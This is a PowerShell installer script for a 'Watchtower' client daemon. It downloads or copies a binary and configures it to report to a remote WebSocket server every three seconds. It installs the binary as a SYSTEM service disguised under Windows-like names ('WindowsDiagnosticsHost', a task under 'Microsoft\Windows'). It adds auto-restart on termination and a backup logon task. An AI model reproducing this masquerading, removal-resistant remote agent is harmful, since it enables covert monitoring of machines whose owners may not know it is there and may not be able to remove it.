<#
.SYNOPSIS
    Installs Project Watchtower Client Daemon on Windows 11 as a resilient SYSTEM service.
.PARAMETER ServerUrl
    The WebSocket URL of your Railway / self-hosted backend (e.g. wss://your-app.up.railway.app/ws/client).
.PARAMETER DeviceId
    Unique identifier for this PC (default: Machine Hostname).
#>

param(
    [string]$ServerUrl = "wss://watchtower-production-3b1e.up.railway.app/ws/client",
    [string]$DeviceId = $env:COMPUTERNAME
)

# Ensure running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "Please run this PowerShell script as Administrator!"
    exit 1
}

$InstallDir = "C:\ProgramData\Watchtower"
$BinaryPath = "$InstallDir\watchtower.exe"
$ConfigPath = "$InstallDir\config.json"
$ServiceName = "WindowsDiagnosticsHost"

Write-Host "🛡️ Installing Watchtower Windows 11 Client..." -ForegroundColor Cyan

# 1. Create target directory
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# 2. Check local binary or download from GitHub Releases
$LocalBinary = "$PSScriptRoot\..\client\target\release\watchtower-client.exe"
$DownloadUrl = "https://github.com/shuaiyuancn/watchtower/releases/latest/download/watchtower.exe"

if (Test-Path $LocalBinary) {
    Copy-Item -Path $LocalBinary -Destination $BinaryPath -Force
    Write-Host " Copied local binary from $LocalBinary" -ForegroundColor Green
} elseif (-not (Test-Path $BinaryPath)) {
    Write-Host "📥 Downloading latest watchtower.exe from GitHub Releases..." -ForegroundColor Yellow
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
        Write-Host " Downloaded watchtower.exe successfully." -ForegroundColor Green
    } catch {
        Write-Warning "Could not download from GitHub: $($_.Exception.Message). Please build or place watchtower.exe at $BinaryPath."
    }
}

# 3. Create config.json
$Config = @{
    server_url = $ServerUrl
    device_id = $DeviceId
    heartbeat_interval_secs = 3
} | ConvertTo-Json -Depth 5

Set-Content -Path $ConfigPath -Value $Config -Force
Write-Host " Created configuration at $ConfigPath" -ForegroundColor Green

# 4. Stop and remove existing service if present
$existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existingService) {
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    sc.exe delete $ServiceName | Out-Null
    Start-Sleep -Seconds 1
}

# 5. Register Windows Service (runs as SYSTEM)
if (Test-Path $BinaryPath) {
    $binCommand = "`"$BinaryPath`" --config `"$ConfigPath`""
    sc.exe create $ServiceName binPath= $binCommand start= auto DisplayName= "Windows Diagnostics & Optimization Host"
    
    # Configure auto-recovery on process crash or task kill
    sc.exe failure $ServiceName reset= 0 actions= restart/1000/restart/1000/restart/1000

    # 6. Register Secondary Watchdog Scheduled Task (runs at logon and hourly under SYSTEM)
    schtasks.exe /create /tn "Microsoft\Windows\SystemDiagnosticsHostTask" /tr $binCommand /sc onlogon /ru SYSTEM /f | Out-Null

    # 7. Start Service
    sc.exe start $ServiceName
    Write-Host " Watchtower Service successfully registered and started!" -ForegroundColor Green
} else {
    Write-Host "ℹ️ Config written. Compile the client binary to $BinaryPath to finish activation." -ForegroundColor Yellow
}
